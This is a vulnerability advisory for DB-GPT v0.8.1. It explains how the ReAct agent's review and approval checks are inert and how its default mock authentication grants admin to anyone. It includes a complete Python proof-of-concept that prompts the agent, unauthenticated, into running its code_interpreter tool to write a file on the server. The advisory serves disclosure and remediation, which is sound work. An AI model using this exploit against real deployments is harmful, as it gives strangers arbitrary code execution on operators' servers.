# DB-GPT ReAct agent missing tool-execution permission gate allows unauthenticated remote action execution without human confirmation (CWE-862, CVSS 9.8)

## Summary

DB-GPT v0.8.1's conversational (ReAct) agent executes tools and actions with no human confirmation because the permission gate is structurally ineffective. `review()` -- the designated pre-action review step -- unconditionally returns `(True, None)` without inspecting the action or asking the user (`packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:791-793`); its result is only stored in `review_info` and is never used to block `act()` (`base_agent.py:616-617`); and the only approval checkpoint runs after action execution and always passes because `approve` is always `True` (`base_agent.py:856-857`). Additionally `ActionOutput.ask_user` defaults to `False` (`packages/dbgpt-core/src/dbgpt/agent/core/action/base.py:56`) and no action in the agent tool-execution path ever sets it `True` (`packages/dbgpt-core/src/dbgpt/agent/core/user_proxy_agent.py:27, 52-53`), so the human-confirmation flow never triggers. Combined with default zero authentication -- `get_user_from_headers()` returns `role="admin"` for any `user-id` header, or `user_id="001"`/`role="admin"` when the header is absent (`packages/dbgpt-serve/src/dbgpt_serve/utils/auth.py:25-38`), and the ReAct chat endpoint `POST /api/v1/chat/react-agent` performs no real identity check (`packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py:4373-4377`) -- an unauthenticated attacker who can reach the service (default listen `0.0.0.0:5670`) can frame a task in natural language so that the agent invokes the default-registered `code_interpreter` tool (`agentic_data_api.py:1951-1958`) and performs arbitrary actions on the server, such as writing files and modifying configuration, with no confirmation step anywhere in the flow.

## Details

The conversational agent's tool-execution path is meant to pass through a human-approval gate before any tool or action runs. Each link of that gate is missing or inert in v0.8.1:

1. **The review step is a no-op.** `review()` is the permission-review hook invoked before actions are acted on. Its body returns approval unconditionally, without looking at the action content and without asking any user:

```python
# packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:791-793
async def review(self, message: Optional[str], censored: Agent) -> Tuple[bool, Any]:
    """Review the message based on the censored message."""
    return True, None
```

2. **The review result is recorded, never enforced.** In the reply-generation loop, the `(approve, comments)` pair is only stored on the reply message; execution of all registered actions proceeds regardless of it:

```python
# packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:616-620
# 2.Review whether what is being done is legal
approve, comments = await self.review(llm_reply, self)
reply_message.review_info = AgentReviewInfo(
    approve=approve,
    comments=comments,
)
```

3. **The only approval checkpoint runs after execution and can never fail.** `verify()` checks `review_info.approve` -- but it runs on the execution results (after `act()`), and because `review()` always returns `True`, the condition `not message.review_info.approve` is always false, so this checkpoint passes unconditionally:

```python
# packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:847-857 -- the only
# approval checkpoint, in verify(), runs after action execution
async def verify(
    self,
    message: AgentMessage,
    sender: Agent,
    reviewer: Optional[Agent] = None,
    **kwargs,
) -> Tuple[bool, Optional[str]]:
    """Verify the current execution results."""
    # Check approval results
    if message.review_info and not message.review_info.approve:
        return False, message.review_info.comments
```

4. **No action ever asks the user.** `ActionOutput.ask_user` defaults to `False`, and no action in the conversational tool-execution path sets it `True`. The human-admin confirmation flow therefore never starts: `UserProxyAgent.ask_user` only becomes `True` when some `action_report.ask_user` is `True`, which never happens on this path.

```python
# packages/dbgpt-core/src/dbgpt/agent/core/action/base.py:56
ask_user: Optional[bool] = False

# packages/dbgpt-core/src/dbgpt/agent/core/user_proxy_agent.py:27, 50-53 -- the
# confirmation flag is only raised if some action requested it
ask_user: bool = False
...
if message.action_report:
    action_report: ActionOutput = message.action_report
    if action_report.ask_user:
        self.ask_user = True
```

The framework's own human-admin agent states the intended contract -- `"A human admin. Interact with the planner to discuss the plan. Plan execution needs to be approved by this admin."` (`user_proxy_agent.py:20-22`) -- but on the conversational tool-execution path that approval never happens.

5. **Default zero authentication.** The service listens on `0.0.0.0:5670` by default. The ReAct chat endpoint's only identity dependency is `get_user_from_headers()`, a mock that fabricates an admin identity for any caller -- any `user-id` header is accepted as `role="admin"`, and even an absent header yields `user_id="001"` with `role="admin"`:

```python
# packages/dbgpt-serve/src/dbgpt_serve/utils/auth.py:25-38
def get_user_from_headers(user_id: Optional[str] = Header(None)):
    try:
        # Mock User Info
        if user_id:
            return UserRequest(
                user_id=user_id, role="admin", nick_name=user_id, real_name=user_id
            )
        else:
            return UserRequest(
                user_id="001", role="admin", nick_name="dbgpt", real_name="dbgpt"
            )
    except Exception as e:
        logging.exception("Authentication failed!")
        raise Exception(f"Authentication failed. {str(e)}")

# packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py:4373-4377
@router.post("/v1/chat/react-agent")
async def chat_react_agent(
    dialogue: ConversationVo = Body(),
    user_token: UserRequest = Depends(get_user_from_headers),
):
```

6. **The agent registers an arbitrary-Python execution tool by default.** The `code_interpreter` tool available to the conversational agent executes arbitrary Python code in a subprocess using the project's Python interpreter:

```python
# packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py:1951-1958
@tool(
    description="Execute Python code for data analysis and computation. "
    "Supports pandas, numpy, matplotlib, json, os, etc. "
    "Use this tool when you need to run Python code to process data, "
    "generate charts, or perform calculations. "
    'Parameters: {{"code": "python code string"}}'
)
async def code_interpreter(code: str) -> str:
```

**Why this is a vulnerability:** the confirmation mechanism "exists" in the code but is structurally ineffective on this path, which is what makes the defect a missing-authorization gap rather than a missing feature. The structural chain is: the review hook is a no-op (:791-793) + its result is recorded but never used to block execution (:616-617) + the only approval checkpoint sits after execution and is always true (:856-857) + `ask_user` is never set `True` by any action on this path (`action/base.py:56`, `user_proxy_agent.py:27, 52-53`). The dynamic verification below confirms the endpoint of the chain: the entire SSE stream of an executed action contains no confirmation/approval event at all. With the mock authentication above, this means an unauthenticated remote caller obtains action execution with no human in the loop.

## Proof of Concept

Dynamically verified against v0.8.1 in August 2026 (5/5 automated assertions passing): an unauthenticated `POST /api/v1/chat/react-agent` returned HTTP 200 SSE and triggered the action on the first attempt (the PoC carries three fallback prompts to absorb LLM phrasing variance); the SSE stream showed a `code_interpreter` tool call and contained no user-confirmation/approval events anywhere; and the agent wrote the marker file with content `POC_EXECUTED` on the server, with no human confirmation. The PoC ran on the same host as the server, so it checks the marker in the local temp directory. The marker filename shown below is neutralized (`poc_marker.txt`); the internal verification run used a different filename.

**Setup:** deploy DB-GPT v0.8.1 with default settings (the webserver listens on `0.0.0.0:5670`). No third-party Python dependencies are needed for the PoC (standard-library `urllib` only, Python 3.11+).

```python
#!/usr/bin/env python3
# PoC — DB-GPT v0.8.1 conversational (ReAct) agent tool-execution permission gate
# missing: unauthenticated action execution with no human confirmation.
# CWE-862: Missing Authorization
#
# Affected product: DB-GPT v0.8.1 (eosphoros-ai/DB-GPT)
#
# The agent executes tools/actions without any human confirmation:
#   base_agent.py:791-793    review() unconditionally returns (True, None)
#   base_agent.py:616-617    the review result is stored in review_info but never
#                            blocks act() — all registered actions execute
#   base_agent.py:856-857    the only approval checkpoint runs after execution
#                            and always passes (approve is always True)
#   action/base.py:56        ActionOutput.ask_user defaults to False and is never
#                            set True — the agent never asks the user
#   user_proxy_agent.py:27,52-53  UserProxyAgent confirmation never triggers
#
# An unauthenticated attacker (default zero authentication, listen 0.0.0.0:5670)
# frames a task in natural language so that the agent performs actions such as
# writing files, with no confirmation step anywhere.
#
# Verification logic (full chain against the real service API, no auth anywhere):
#   [Prerequisite]  confirm the service is reachable
#   [Step 1]        unauthenticated ReAct chat request inducing the agent to
#                   perform a "write marker file" action
#   [Step 2]        verify the SSE output shows the action executed
#                   (code_interpreter tool call)
#   [Step 3]        verify the SSE stream contains no user-confirmation /
#                   approval events (dynamic evidence of the no-op review)
#   [Step 4]        verify the marker file exists on the server with content
#                   POC_EXECUTED (action executed without confirmation)
#   [Step 5]        cleanup: delete the marker file
#
# Test environment:
#   - DB-GPT v0.8.1 (http://localhost:5670)
#   - Python 3.11+ (urllib standard library, no extra dependencies)
#   - Windows 11 / Linux (cross-platform)
#
# Usage:
#   python poc.py [--target http://localhost:5670]

import json
import os
import sys
import tempfile
import time
import urllib.error
import urllib.request
import uuid

TARGET = "http://localhost:5670"
if len(sys.argv) > 2 and sys.argv[1] == "--target":
    TARGET = sys.argv[2]

PASSED = 0
FAILED = 0

# Marker file: located in the temp directory of the host running the server
# (server and PoC were co-located during verification).
MARKER = os.path.join(tempfile.gettempdir(), "poc_marker.txt").replace("\\", "/")

# Three prompts inducing the LLM to call a tool that performs the
# "write marker file" action (fallbacks to absorb LLM phrasing variance).
PROMPTS = [
    "Please use the code_interpreter tool to save the string 'POC_EXECUTED' to a text "
    f"file at path {MARKER}. Provide the Python code as the 'code' argument of the "
    "code_interpreter tool, then call the tool to run it.",
    "Please call the code_interpreter tool to run Python code that writes POC_EXECUTED "
    f"into the text file at {MARKER}. Use the code_interpreter tool with its 'code' "
    "parameter set to the Python code.",
    "Please invoke the code_interpreter tool to execute the following task: write the "
    f"string POC_EXECUTED to a file at {MARKER}. Pass the Python code to the "
    "code_interpreter tool's code parameter.",
]

# Evidence of the missing permission gate: if any of these keywords appeared in
# the SSE stream, a user-confirmation/approval step would have occurred. Under
# this vulnerability none of them appears — review() unconditionally approves
# and the agent never asks the user.
CONFIRM_KEYWORDS = [
    "ask_user",
    "ask_user_flag",
    "confirm",
    "approval",
    "approve",
    "waiting",
    "need_user",
    "please confirm",
    "user confirmation",
]


def check(name: str, condition: bool, detail: str = "") -> None:
    """Record a single check result and print [PASS] or [FAIL]."""
    global PASSED, FAILED
    if condition:
        PASSED += 1
        print(f"  [PASS] {name}  {detail}")
    else:
        FAILED += 1
        print(f"  [FAIL] {name}  {detail}")


def api(method: str, path: str, body=None, timeout: int = 30):
    """Send an HTTP request; return (status code, response text)."""
    data = json.dumps(body).encode("utf-8") if body is not None else None
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(TARGET + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"{{'error': {str(e)!r}}}"


def react_chat(prompt: str, conv_uid: str, timeout: int = 180) -> tuple:
    """Call the ReAct chat endpoint without authentication, inducing the
    conversational agent to perform an action.

    Returns (HTTP status code, full SSE output text).
    """
    body = {
        "chat_mode": "chat_react_agent",
        "conv_uid": conv_uid,
        "model_name": "deepseek-v4-pro",
        "temperature": 0,
        "user_input": prompt,
    }
    data = json.dumps(body).encode("utf-8")
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(
        TARGET + "/api/v1/chat/react-agent", data=data, headers=h, method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def marker_ok() -> bool:
    """Check whether the marker file exists with content POC_EXECUTED."""
    try:
        if not os.path.exists(MARKER):
            return False
        with open(MARKER, encoding="utf-8", errors="replace") as f:
            return f.read().strip() == "POC_EXECUTED"
    except Exception:
        return False


def sse_executed_action(sse_text: str) -> bool:
    """Check whether the agent actually executed an action (tool call)."""
    return '"action": "code_interpreter"' in sse_text


def sse_no_confirmation(sse_text: str) -> bool:
    """Check that the SSE stream contains no user-confirmation/approval event.

    If a user-confirmation mechanism existed, the stream would contain an event
    or keyword waiting for the user's approval; under this vulnerability
    review() unconditionally approves and none of these keywords appears.
    """
    lower = sse_text.lower()
    for kw in CONFIRM_KEYWORDS:
        if kw.lower() in lower:
            return False
    return True


def main() -> bool:
    global PASSED, FAILED
    print()
    print("=" * 62)
    print("  DB-GPT v0.8.1")
    print("  conversational agent tool-execution permission gate missing — PoC")
    print(f"  target: {TARGET}")
    print("=" * 62)
    print()

    # ── Prerequisite check ──
    print("[Prerequisite] confirm the service is reachable")
    code, body = api("GET", "/api/controller/models")
    check("DB-GPT service reachable", code == 200, f"HTTP {code}")
    if code != 200:
        print("  Please start the service first: dbgpt start webserver")
        return False
    print()

    # ── Step 1: unauthenticated conversation inducing the action ──
    print("[Step 1] unauthenticated ReAct chat inducing the agent to write the marker file")
    conv_uid = "poc-" + uuid.uuid4().hex[:8]
    print(f"  conv_uid={conv_uid} (no authentication, no credential headers)")
    if os.path.exists(MARKER):
        os.remove(MARKER)
    sse_full = ""
    used_prompt = 0
    trigger_ok = False
    for i, prompt in enumerate(PROMPTS, start=1):
        used_prompt = i
        print(f"  attempt {i}: sending unauthenticated react-agent request (waiting for the agent to act)...")
        st, sse = react_chat(prompt, conv_uid)
        sse_full = sse
        for _ in range(30):
            time.sleep(1)
            if marker_ok():
                trigger_ok = True
                break
        if trigger_ok:
            break
        print(f"  attempt {i} did not trigger (HTTP {st}), retrying with the next prompt ...")
    check("agent executed the action (marker file contains POC_EXECUTED)",
          trigger_ok, f"attempt {used_prompt}  marker={MARKER}")
    print()

    # ── Step 2: verify the action executed in the SSE stream ──
    print("[Step 2] verify the SSE stream shows the agent executed an action (tool call)")
    executed = sse_executed_action(sse_full)
    check("SSE shows a code_interpreter tool call", executed,
          "step.meta action=code_interpreter")
    if executed:
        for line in sse_full.splitlines():
            if '"action": "code_interpreter"' in line:
                print(f"  evidence: {line[:400]}")
                break
    print()

    # ── Step 3: verify no user confirmation anywhere ──
    print("[Step 3] verify the SSE stream contains no user-confirmation/approval event")
    no_confirm = sse_no_confirmation(sse_full)
    check("SSE contains no user confirmation/approval event", no_confirm,
          "review() unconditionally approves; the agent never asks the user")
    if not no_confirm:
        for kw in CONFIRM_KEYWORDS:
            if kw.lower() in sse_full.lower():
                print(f"  confirmation keyword present: {kw}")
    print()

    # ── Step 4: verify the action result (marker content) ──
    print("[Step 4] verify the action result (marker file content)")
    content = ""
    if os.path.exists(MARKER):
        with open(MARKER, encoding="utf-8", errors="replace") as f:
            content = f.read().strip()
    check("marker content correct", content == "POC_EXECUTED", f"content: {content!r}")
    print()

    # ── Step 5: cleanup ──
    print("[Step 5] cleanup (delete the marker file)")
    if os.path.exists(MARKER):
        os.remove(MARKER)
        print("  marker file deleted")
    print()

    # ── Summary ──
    total = PASSED + FAILED
    print("=" * 62)
    print(f"  result: {PASSED}/{total} passed")
    if FAILED == 0:
        print("  verdict: vulnerable")
        print("  conversational agent tool-execution permission gate missing")
        print("  (action execution with no human confirmation) confirmed")
    else:
        print("  verdict: some checks failed, please inspect the service state")
    print("=" * 62)
    print()
    print("root cause:")
    print("  base_agent.py:791-793    — review() unconditionally returns (True, None)")
    print("  base_agent.py:616-617    — review result stored in review_info, never blocks act()")
    print("  base_agent.py:856-857    — the only approval checkpoint runs after execution")
    print("  action/base.py:56        — ActionOutput.ask_user defaults to False, never set True")
    print("  user_proxy_agent.py:27   — UserProxyAgent never asks the user for confirmation")
    print("  → tool calls execute with zero human confirmation → CWE-862")
    print()

    return FAILED == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
```

**Run:**

```bash
# 1) start DB-GPT v0.8.1 with default settings (listens on 0.0.0.0:5670)
# 2) run the PoC against it (no credentials anywhere):
python poc.py --target http://localhost:5670
```

**Expected output (5/5):**

```
[Prerequisite] confirm the service is reachable
  [PASS] DB-GPT service reachable  HTTP 200

[Step 1] unauthenticated ReAct chat inducing the agent to write the marker file
  [PASS] agent executed the action (marker file contains POC_EXECUTED)  attempt 1

[Step 2] verify the SSE stream shows the agent executed an action (tool call)
  [PASS] SSE shows a code_interpreter tool call  step.meta action=code_interpreter

[Step 3] verify the SSE stream contains no user-confirmation/approval event
  [PASS] SSE contains no user confirmation/approval event

[Step 4] verify the action result (marker file content)
  [PASS] marker content correct  content: 'POC_EXECUTED'

[Step 5] cleanup (delete the marker file)
  marker file deleted

  result: 5/5 passed
  verdict: vulnerable
```

## Impact

- **Type:** Missing Authorization (CWE-862) for the ineffective tool-execution permission gate; Missing Authentication (CWE-306) for the default zero-authentication deployment. The unauthenticated path drives the default-registered `code_interpreter` tool, which executes arbitrary Python code in a subprocess using the project's Python interpreter (`agentic_data_api.py:1951-1962`).
- **Who is impacted:** any operator running DB-GPT v0.8.1 with the conversational (ReAct) endpoint reachable -- the service listens on `0.0.0.0:5670` by default, so a standard installation is exposed to any network client that can reach that port.
- **Attacker capabilities:** with no credentials and no human-confirmation step anywhere, an unauthenticated attacker frames a task in natural language (for example a legitimate "save a file" task) so that the agent performs arbitrary actions on the server -- writing files, modifying configuration, and executing arbitrary Python through `code_interpreter` with the privileges of the DB-GPT server process. Verified dynamically: an unauthenticated POST returned HTTP 200 SSE, the stream contained no confirmation/approval events, and the marker file was written with `POC_EXECUTED`.
- **Prerequisites:** present in a standard installation (independent of Docker); the attacker only needs network reachability to `0.0.0.0:5670`; default zero authentication requires no credentials; the tool-execution chain contains no human confirmation or capability-approval gate.
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical).
  - AV:N -- HTTP `POST /api/v1/chat/react-agent` on the default `0.0.0.0:5670` listener.
  - AC:L -- a legitimate "save a file" task framing triggered the action reliably (5/5, with three built-in fallback prompts).
  - PR:N -- default zero authentication, confirmed at source level (`auth.py:25-38`).
  - UI:N -- the conversational endpoint has no human-confirmation step; the missing permission gate makes all tools execute automatically, never asking a user.
  - S:U -- tool execution runs within the server process privilege context.
  - C:H -- `code_interpreter` executes arbitrary Python code.
  - I:H -- the marker-file write demonstrates integrity impact; the same path performs arbitrary actions such as modifying configuration.
  - A:H -- arbitrary agent actions execute on the server with the server process privileges.

**Scope note (alternate scoring).** If the scope is instead treated as Changed, the same vector with S:C scores 10.0 (Critical). The S:U score above was independently re-checked with the official FIRST CVSS v3.1 formula: `roundup(9.760237) = 9.8`.

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Product** | `DB-GPT` (eosphoros-ai/DB-GPT) |
| **Affected versions** | `0.8.1` |
| **Patched versions** | `None` (no official fix released as of the reporting date) |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

## Remediation

**Temporary mitigations:**

1. Network layer: restrict port 5670 to internal/trusted networks only; do not expose it directly to the public internet (firewall/security group).
2. Upgrade: upgrade to an official fixed release; until one exists, avoid conversational applications with tool-execution capabilities such as `code_interpreter`.
3. Configuration: enable authentication for the conversational endpoint or place a reverse proxy with authentication in front of it; apply an allowlist to tool calls.
4. Monitoring: alert on `/api/v1/chat/react-agent` calls, `code_interpreter` tool invocations, and anomalous file writes.
5. Minimization: do not run public-facing model/agent services in production; where necessary, front them with a reverse proxy plus authentication.

**Code-level fix direction:** implement real review/inquiry logic in `review()`; enforce the review result before `act()` executes (instead of only recording it, with the sole checkpoint after execution); for high-risk actions set `ActionOutput.ask_user` to `True` so the `UserProxyAgent` confirmation chain is actually wired up.

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-862 | Missing Authorization | `review()` unconditionally returns `(True, None)` (base_agent.py:791-793), its result is stored but never blocks `act()` (base_agent.py:616-617), and the only approval checkpoint runs after execution and always passes (base_agent.py:856-857); `ActionOutput.ask_user` defaults to `False` (action/base.py:56) and is never set `True` on the tool-execution path (user_proxy_agent.py:27, 52-53) |
| 2 | CWE-306 | Missing Authentication for Critical Function | `get_user_from_headers()` returns `role="admin"` for any `user-id` header or none (auth.py:25-38), and the ReAct chat endpoint `POST /api/v1/chat/react-agent` performs no real identity check (agentic_data_api.py:4373-4377) |
